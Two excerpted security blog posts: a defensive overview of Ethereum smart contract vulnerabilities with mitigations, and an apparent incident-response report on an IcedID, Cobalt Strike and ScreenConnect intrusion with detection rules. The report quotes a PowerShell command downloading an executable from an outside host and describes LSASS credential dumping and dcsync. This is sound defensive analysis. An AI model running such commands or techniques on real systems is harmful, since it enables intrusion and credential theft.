<blockquote>
Some implementations of blockchain technology, such as Ethereum, offer a means to develop software called smart contracts that are used to automate transactions and contracts in general, without the need for a mutually trusted intermediary.   ...   <br>This blog post focuses on the Ethereum blockchain, as it is the most popular chain for smart contracts.   ...   <br>Blockchain   ...   <br>Once a block is formed it is then added to the blockchain sequentially and permanently in a way that achieves consensus on the blockchain across all nodes.   ...   <br>Smart Contract   ...   <br>In a nutshell, a smart contract is a program (i.e., code) that is stored and run on the blockchain.   ...   <br>As smart contracts run on the blockchain, they eliminate the need for intermediaries, such as lawyers or brokers, as the code itself enforces the terms of the agreement.   ...   <br>Gas   ...   <br>Reentrancy Front-running Logic error Block gas limit vulnerability Oracle manipulation Timestamp dependence Arithmetic underflow/overflow Reentrancy attack Overview   ...   <br>Reentrancy attacks typically occur when functions within a (vulnerable) smart contract can be entered multiple times before the state of the smart contract is updated.   ...   <br>Such an vulnerability can allow an attacker to steal a smart contract’s financial funds.   ...   <br>By increasing the gas price of their transaction, it is more likely that the attacker’s transactions, within the same block, is processed before the legitimate user’s transaction.   ...   <br>This is an example of front-running.   ...   <br>Mitigations Orderless/Batching: Observe that frontrunning attacks rely on the (re)ordering/timing of the transactions within a block/over multiple blocks.   ...   <br>A prominent real-life incident caused by a logic error was a typo in the Hegic trading protocol that prevented clients from accessing their assets as soon as their contract expired, resulting in about $48000 of financial damages.   ...   <br>Consequently, a smart contract that is vulnerable to a block gas limit vulnerability cannot be executed to completion, potentially rendering it unusable.   ...   <br>The list of participants was kept in a data structure that dynamically grows with the number of participants.   ...   <br>However, note that mitigations and solutions should be tailored to the smart contract in question since the variety of use cases makes it difficult to provide generic mitigations for oracle manipulation.   ...   <br>As the name suggests, a smart contract that relies on block timestamps to perform operations is susceptible to block timestamp manipulation by a malicious node, which can result in theft of resources and reputational damage (see also here).   ...   <br>If this is not possible, it is recommended to rely on multiple trusted oracles for timestamping, instead of using block.timestamp or block.number (see also Timestamp Dependence – Ethereum Smart Contract Best Practices).   ...   <br>This can potentially subvert the contract’s logic; a vulnerability an attacker can exploit.   ...   <br>It is recommended to use at least Solidity 0.8.   ...   <br>For Solidity 0.7 or lower, use checked arithmetic whenever possible.   ...   <br>Developers need to be aware of various smart contract vulnerabilities and their mitigations.   ...

Table of Contents: Case Summary The DFIR Report Services Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections   ...   <br>The forked IcedID loader then communicated with a command and control server, leading to the dropping and execution of another IcedID DLL.   ...   <br>Around two hours into the intrusion, the threat actor installed ScreenConnect on the beachhead using a renamed installer binary, “toovey.exe.” They executed multiple commands on the host via ScreenConnect.   ...   <br>Once the Cobalt Strike beacons were executed, they established communication with the Cobalt Strike command and control server.   ...   <br>Within 20 minutes of this activity, a new payload, cslite.exe (CSharp Streamer C2), was dropped on the beachhead.   ...   <br>During this intrusion, it was first used to access the LSASS process on the beachhead for credential access; and around 40 minutes after that, the threat actor performed a dcsync operation from the beachhead host to one of the domain controllers.   ...   <br>After installing ScreenConnect, we observed a log in to the domain controller using ScreenConnect to access the host.   ...   <br>On the second day, the threat actor returned and performed network discovery on the domain controller using SoftPerfect’s network scanner.   ...   <br>Following this, ScreenConnect was installed on the second domain controller, and an RDP session was started from this domain controller to a file server.   ...   <br>On the file server, both a Cobalt Strike beacon and the ScreenConnect installer were dropped and executed via the RDP session.   ...   <br>On day seven of the intrusion, a RDP connection was initiated from the beachhead to the backup and the file server using CSharp Streamer.   ...   <br>First, they used xcopy to stage the ScreenConnect installer across all Windows hosts in the domain and then executed it using a WMI command.   ...   <br>This can be observed in logs, as ScreenConnect drops the desired script on disk, followed by the corresponding interpreter, as discussed in a previous report.   ...   <br>This can be seen in various events, such as Security Event ID 4688 or Sysmon Event 1, as displayed below.   ...   <br>As in most intrusions we document, Cobalt Strike beacons were used in this intrusion.   ...   <br>powershell Invoke-WebRequest "http://temp.sh/VSlAV/http64.exe" -OutFile C:\programdata\rr.exe   ...   <br>Because the beacon was using plain HTTP, the retrieved PowerShell payload can be extracted from the network communications.   ...   <br>As documented in Cobalt Strike, a Defender’s Guide part 1 and part 2, the attackers used Cobalt Strike’s default pipe names, which can be easily detected.   ...   <br>p as the relay service’s port.   ...   <br>During the intrusion, the threat actor deleted the renamed ScreenConnect installers from the backup server and the file server using the “del” command, in an attempt to cover their tracks.   ...   <br>On day one, through hands-on activity, the threat actor executed cslite.exe (a CSharp Streamer file dropped on the Desktop of a compromised user), which was used to access the LSASS process.   ...   <br>0x1010: PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and PROCESS_VM_READ (0x0010) 0x1FFFFF: PROCESS_ALL_ACCESS   ...   <br>We also were able to collect memory and scan it with various YARA rules, confirming the use of a Mimikatz implementation with several rule hits for the cslite.exe memory space and file:   ...   <br>Finally, on the second day, we can see yet another access to LSASS, this time from rundll32.exe, once again using access 0x1010 and with UNKNOWN in the CallTrace.   ...   <br>This time, rundll32.exe was spawned by PowerShell, which was tasked to download and execute a Cobalt Strike beacon.   ...   <br>The renamed ScreenConnect installer was copied from the beachhead to domain controllers, a backup server, and a file server using SMB.   ...   <br>As explained in the execution section, the installer was also executed via Impacket’s wmiexec.py script, which resulted in the ScreenConnect installation.   ...   <br>The threat actor leveraged the following methods to access the hosts within the network:   ...   <br>IcedID Cobalt Strike CSharp Streamer ScreenConnect   ...   <br>]com over port 443, which resolved at the time to 212.18.104.12.   ...   <br>The threat actor dropped Cobalt Strike beacons across hosts during the intrusion, communicating with the following IP addresses.   ...   <br>Post the initial forked IcedID loader infection, the threat actor deployed ScreenConnect on the beachhead using a renamed binary “toovey.exe”.   ...   <br>On the remote hosts, the “WMIPrvSE.exe” was observed executing the task.   ...   <br>90f138c1-f578-4ac3-8c49-eecfd847c8b7: BITS Transfer Job Download From Direct IP 10c14723-61c7-4c75-92ca-9af245723ad2: HackTool - Potential Impacket Lateral Movement Activity b1f73849-6329-4069-bc8f-78a604bb8b23: Remote Access Tool - ScreenConnect Remote Command Execution 90b63c33-2b97-4631-a011-ceb0f47b77c3: Suspicious Execution From GUID Like Folder Names 19b08b1c-861d-4e75-a1ef-ea0c1baf202b: Suspicious Download Via Certutil.EXE d059842b-6b9d-4ed1-b5c3-5b89143c6ede: File Download Via Bitsadmin e37db05d-d1f9-49c8-b464-cee1a4b11638: PUA - Rclone Execution 7090adee-82e2-4269-bd59-80691e7c6338: Console CodePage Lookup Via CHCP d5601f8c-b26f-4ab0-9035-69e11a8d4ad2: CobaltStrike Named Pipe c8557060-9221-4448-8794-96320e6f3e74: Windows PowerShell User Agent 1edff897-9146-48d2-9066-52e8d8f80a2f: Suspicious Invoke-WebRequest Execution With DirectIP 0ef56343-059e-4cb6-adc1-4c3c967c5e46: Suspicious Execution of Systeminfo 903076ff-f442-475a-b667-4f246bcc203b: Nltest.EXE Execution 5cc90652-4cbd-4241-aa3b-4b462fa5a248: Potential Recon Activity Via Nltest.EXE 624f1f33-ee38-4bbe-9f4a-088014e0c26b: IcedID Malware Execution Patterns   ...
